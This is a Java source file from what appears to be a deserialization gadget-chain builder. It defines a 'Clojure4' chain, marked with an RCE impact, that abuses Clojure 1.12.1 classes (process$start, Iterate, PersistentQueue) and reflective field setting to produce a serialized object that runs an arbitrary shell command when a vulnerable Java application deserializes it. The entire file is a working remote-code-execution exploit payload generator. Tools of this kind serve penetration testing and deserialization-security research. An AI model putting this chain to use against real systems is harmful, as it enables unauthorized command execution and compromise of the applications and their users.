package org.ses.gadgetbuilder.chains1;

import clojure.core$partial$fn__5929;
import clojure.core$partial$fn__5931;
import clojure.core$partial$fn__5933;
import clojure.lang.Iterate;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.HashCodeTrampoline;

import clojure.java.process$start;
import clojure.lang.*;
import org.ses.gadgetbuilder.util.Reflections;

/**
 * https://hackmd.io/@fe1w0/HyefvRQKp
 * Adapted to recent Clojure version
 */
@Authors(Authors.FE1W0)
@Impact(Impact.RCE)
@Dependencies({"org.clojure:clojure:1.12.1"})
public class Clojure4 extends GadgetChain<HashCodeTrampoline> {
    public Clojure4(HashCodeTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        process$start p_start = new process$start();

        String[] commandArr = command.split(" ");

        IFn core = null;

        switch (commandArr.length) {
            case 1:
                core = new core$partial$fn__5929(commandArr[0], p_start);
                break;
            case 2:
                core = new core$partial$fn__5931(commandArr[0], commandArr[1], p_start);
                break;
            case 3:
                core = new core$partial$fn__5933(commandArr[0], p_start, commandArr[1], commandArr[2]);
                break;
        }

        Iterate iterate = (Iterate) Iterate.create(core, "");
        if (commandArr.length == 4) {
            iterate = (Iterate) Iterate.create(core, commandArr[3]);
        }

        PersistentQueue model = PersistentQueue.EMPTY;
        Reflections.setFieldValue(model, "f", iterate);
        Reflections.setFieldValue(model, "_hash", 0);

        return new TrampolineConnector(model);
    }

    @Override
    protected void postProcessPayload() throws Exception {
    }



}
